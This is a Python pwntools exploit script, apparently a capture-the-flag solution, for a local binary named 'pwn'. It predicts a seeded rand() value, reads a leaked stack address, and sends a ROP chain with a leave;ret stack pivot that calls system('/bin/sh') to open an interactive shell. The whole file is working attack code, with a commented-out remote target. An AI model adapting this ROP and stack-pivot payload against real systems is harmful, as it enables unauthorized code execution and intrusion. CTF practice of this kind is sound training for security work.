from pwn import *
from pwn import p64
import socket
from ctypes import *
# log_level = 'debug'
context(arch='amd64', os='linux', log_level='DEBUG')
context.terminal = [
    '/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe', 'nt', 'Ubuntu', '-c']
# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
elf = cdll.LoadLibrary('libc.so.6')
r = process("./pwn")
elf.srand(66)

r.sendlineafter(b'input a num:\n', str(elf.rand()))
print(r.recvline())
gift_addr = r.recvline()
gift_addr = int(gift_addr[5:-1], 16)
print(hex(gift_addr))
elf = ELF('./pwn')

leave_ret_addr = 0x4012D6
pop_rdi_addr = 0x4013d3
system_addr = 0x4010D0

gdb.attach(r)
pause()
#                (                 ROP                    )           /bin/sh                         (栈迁移的地址-8)         leave_ret
payload = p64(pop_rdi_addr) + p64(gift_addr+24) + p64(system_addr) + b'/bin/sh\x00' + p64(gift_addr-8) + p64(leave_ret_addr)
#                                                                                                         rbp            rbp+8 -> retn_addr
payload = (p64(pop_rdi_addr) + p64(gift_addr+24) + p64(system_addr) + b'/bin/sh\x00').ljust(32, b'A') + p64(gift_addr-8) + p64(leave_ret_addr)

r.sendline(payload)

r.interactive()
